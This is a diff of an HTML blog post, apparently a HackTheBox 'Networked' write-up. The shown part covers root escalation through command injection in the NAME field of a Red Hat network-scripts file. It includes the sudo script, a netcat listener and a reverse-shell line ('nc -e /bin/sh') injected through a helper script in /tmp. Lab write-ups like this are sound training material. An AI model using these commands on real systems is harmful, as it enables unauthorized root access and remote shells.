-</code></pre></div><p>Without surprise we can not write in the file. Let's investigate to check if we can find a flow in it's working.</p>
+</code></pre></div><p>Without surprise we can not write in the file. Let&rsquo;s investigate to check if we can find a flow in it&rsquo;s working.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>guly@networked<span style="color:#f92672">]</span>$ cat /usr/local/sbin/changename.sh
 <span style="color:#75715e">#!/bin/bash -p</span>
 cat &gt; /etc/sysconfig/network-scripts/ifcfg-guly <span style="color:#e6db74">&lt;&lt; EoF
@@ -395,7 +407,7 @@ regexp<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</spa
 
 /sbin/ifup guly0
 </code></pre></div><p>The script take various user input to set them in a network configuration file <code>/etc/sysconfig/network-scripts/ifcfg-guly</code>. At the end the <code>/sbin/ifup guly0</code> apply the new configuration.</p>
-<h2 id="network-script-privilege-escalation">network-script privilege escalation<a href="#network-script-privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h2 id="network-script-privilege-escalation">network-script privilege escalation</h2>
 <p>This one was new for me, while searching for informations about <code>network-script</code> I stumbled across this <code>SecList</code>:</p>
 <blockquote>
 <p>Redhat/CentOS root through network-scripts
@@ -413,7 +425,7 @@ DEVICE=eth0</p>
 <p><a href="https://seclists.org/fulldisclosure/2019/Apr/24">https://seclists.org/fulldisclosure/2019/Apr/24</a></p>
 </blockquote>
 <p>Sounds exactly what we need since the <code>changename.sh</code> script edit the <code>NAME</code> value with user input string. And now I understand why the <code>Networked</code> name was chosen.</p>
-<p>Let's give it a try. First we open a new listener:</p>
+<p>Let&rsquo;s give it a try. First we open a new listener:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nc -l -vv -p <span style="color:#ae81ff">8599</span>
 Listening on any address <span style="color:#ae81ff">8599</span>
 </code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>guly@networked<span style="color:#f92672">]</span>$ sudo /usr/local/sbin/changename.sh
@@ -422,9 +434,9 @@ nc -e /bin/sh 10.10.10.10 <span style="color:#ae81ff">8599</span>
 wrong input, try again
 interface NAME:
 ^C
-</code></pre></div><p>Alright, that couldn't be that easy&hellip; The input is filtered. The rule is the following:</p>
+</code></pre></div><p>Alright, that couldn&rsquo;t be that easy&hellip; The input is filtered. The rule is the following:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">regexp<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">^[a-zA-Z0-9_\ /-]+</span>$<span style="color:#e6db74">&#34;</span>
-</code></pre></div><p>This regex doesn't seems that bad, we can still use <code>_</code>, spaces, <code>/</code> and <code>-</code>. To be honest at this point it gets really easy to overthink the solution which is quite simple in the end.</p>
+</code></pre></div><p>This regex doesn&rsquo;t seems that bad, we can still use <code>_</code>, spaces, <code>/</code> and <code>-</code>. To be honest at this point it gets really easy to overthink the solution which is quite simple in the end.</p>
 <p>Call to an external script should perfectly work:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>guly@networked<span style="color:#f92672">]</span>$ echo <span style="color:#e6db74">&#34;nc -e /bin/sh 10.10.10.10 8599&#34;</span> &gt; /tmp/hg8
 <span style="color:#f92672">[</span>guly@networked<span style="color:#f92672">]</span>$ chmod +x /tmp/hg8
@@ -450,62 +462,71 @@ uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root
 <p>See you next time !</p>
 <p>-hg8</p>
 
-      </div></div>
-  
-  <div class="pagination">
-    <div class="pagination__title">
-      <span
-        class="pagination__title-h">Read other posts</span>
-      <hr />
     </div>
-    <div class="pagination__buttons">
+    
       
-      <span class="button previous">
-        <a href="/posts/jarvis/">
-          <span class="button__icon">←</span>
-          <span class="button__text">Jarvis - HackTheBox</span>
-        </a>
-      </span>
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="/posts/wall/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">Wall - HackTheBox</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="/posts/jarvis/">
+                  <span class="button__text">Jarvis - HackTheBox</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
       
+    
+
+
+    
       
-      <span class="button next">
-        <a href="/posts/haystack/">
-          <span class="button__text">Haystack - HackTheBox</span>
-          <span class="button__icon">→</span>
-        </a>
-      </span>
+        
+
       
+    
+
     </div>
-  </div>
-  
 
-  
+      </div>
 
-</div>
-
-  </div>
-
-  
-    <footer class="footer">
+      
+        <footer class="footer">
   <div class="footer__inner">
     
-      <div class="copyright">
-        <span>© 2020 Powered by <a href="http://gohugo.io">Hugo</a></span>
-    
-        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      <div class="footer__content">
+        <span>© 2020</span>
+        <span><a href="https://hg8.rocks" target="_blank" rel="noopener">hg8</a></span>
+        <span><a class="social-icon" href="https://github.com/hg8" target="_blank" rel="noopener" title="Github">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 20" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg>
+            </a></span>
       </div>
+    
   </div>
 </footer>
+
+
 
 <script src="/assets/main.js"></script>
 <script src="/assets/prism.js"></script>
 
+      
+    </div>
 
-
-
-
-  
-</div>
-
-</body>
+    
+  </body>
 </html>
